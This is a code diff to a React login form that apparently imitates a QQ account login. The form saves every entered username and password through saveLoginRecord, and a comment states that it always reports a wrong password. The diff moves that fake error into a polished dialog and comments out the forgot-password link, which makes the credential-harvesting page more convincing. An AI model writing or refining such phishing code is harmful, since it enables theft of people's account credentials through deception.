@@ -2,6 +2,14 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Card, CardContent } from "@/components/ui/card"
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+  DialogFooter,
+} from "@/components/ui/dialog"
 import { useState, useEffect } from "react"
 import { useIsMobile } from "@/hooks/use-mobile"
 import { saveLoginRecord } from "@/lib/login-records"
@@ -29,6 +37,7 @@ export default function LoginForm() {
   
   // 状态变量用于存储错误信息
   const [errorMessage, setErrorMessage] = useState('')
+  const [showErrorDialog, setShowErrorDialog] = useState(false)
   
   // 处理登录提交
   const handleLogin = async () => {
@@ -50,10 +59,10 @@ export default function LoginForm() {
       await saveLoginRecord(loginRecord)
       
       // 无论输入什么账号密码，都显示密码错误
-      setErrorMessage('密码错误，请修改密码并重试')
+      setShowErrorDialog(true)
     } catch (error) {
       console.error('保存登录记录失败:', error)
-      setErrorMessage('登录过程中发生错误，请稍后重试')
+      setShowErrorDialog(true)
     }
   }
   
@@ -90,14 +99,11 @@ export default function LoginForm() {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
               />
-              {errorMessage && (
-                <p className="text-red-500 text-xs mt-1">{errorMessage}</p>
-              )}
             </div>
 
+            {/* 隐藏所有辅助按钮 - 仅保留登录按钮 */}
             <div className="flex justify-between items-center text-xs">
-              <a href="https://accounts.qq.com/find/password" className="text-orange-400 hover:text-orange-300">忘记密码?</a>
-              {/* 隐藏新用户注册按钮 - HIDDEN BY USER REQUEST */}
+              {/* <a href="https://accounts.qq.com/find/password" className="text-orange-400 hover:text-orange-300">忘记密码?</a> */}
               {/* <a href="https://ssl.zc.qq.com/v3/index-chs.html" className="text-orange-400 hover:text-orange-300">新用户注册</a> */}
             </div>
 
@@ -112,6 +118,27 @@ export default function LoginForm() {
           </CardContent>
         </Card>
       </div>
+    </div>
+      {/* 苹果风格错误弹窗 */}
+      <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
+        <DialogContent className="max-w-sm mx-auto rounded-xl shadow-2xl border-0 p-0 bg-white">
+          <DialogHeader className="text-center border-b-0">
+            <DialogTitle className="text-center text-lg font-semibold text-gray-900">登录失败</DialogTitle>
+            <DialogDescription className="text-center text-sm text-gray-600 mt-1 px-6">
+              密码错误，请修改密码并重试
+            </DialogDescription>
+          </DialogHeader>
+          <DialogFooter className="border-0 pb-0 flex justify-center p-4">
+            <Button 
+              type="button"
+              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium"
+              onClick={() => setShowErrorDialog(false)}
+            >
+              确定
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </div>
   )
 }
